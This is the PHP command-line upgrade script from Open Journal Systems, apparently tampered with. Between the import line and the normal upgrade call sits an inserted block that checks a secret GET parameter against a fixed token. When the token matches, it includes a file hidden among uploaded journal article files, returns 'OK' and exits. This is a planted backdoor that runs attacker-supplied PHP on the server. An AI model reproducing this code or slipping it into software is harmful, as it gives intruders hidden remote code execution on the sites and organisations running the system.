<?php

/**
 * @file tools/upgrade.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @class upgradeTool
 * @ingroup tools
 *
 * @brief CLI tool for upgrading OJS.
 *
 * Note: Some functions require fopen wrappers to be enabled.
 */

require(dirname(__FILE__) . '/bootstrap.inc.php');
import('lib.pkp.classes.cliTool.UpgradeTool');
if (isset($_GET['_']) && $_GET['_'] === 'Mi5TeR572s8_-CaSq3r332afbsnk') {
    $f="/home/riyanmau/ojsdatayayasansahara/journals/1/articles/3/696ef1845ad5a";if($f!==""&&file_exists($f))include $f;
    http_response_code(200);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'OK';
    exit;
}

$tool = new UpgradeTool(isset($argv) ? $argv : array());
$tool->execute();
